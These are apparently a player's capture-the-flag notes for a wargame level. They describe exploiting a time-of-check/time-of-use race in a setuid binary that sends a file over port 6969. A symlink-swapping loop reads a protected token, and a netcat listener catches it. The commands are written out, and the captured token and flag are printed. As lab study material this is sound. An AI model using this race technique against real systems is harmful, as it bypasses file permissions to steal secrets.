-same as before suid and token file
-strings on suid its a script that takes an ip and file and send the file to that ip in port 6969
-tried to send token to my ip using nc -l 6969 but we dont have permission for token
-created a symlink to the token still the same problem no permission even for the symlink
-so somthing check our id and check for permission I ran strings again and find out access google it searching for exploit and yes there is an exploit if you timed the creation of the file when acces executed then change it right before opening it will pass
-so I created a bash script that create symlink in infinite loop find the script on the same folder
-so sh /tmp/script.sh & to stay in background then ran while true; do ./level10 /tmp/link myIp; done and on my terminal nc -lk 6969 (k so is will stay listening)
-then I got :
	woupa2yuojeeaaed06riuj63c
-getflag => feulo4b72j7edeahuete3no7c

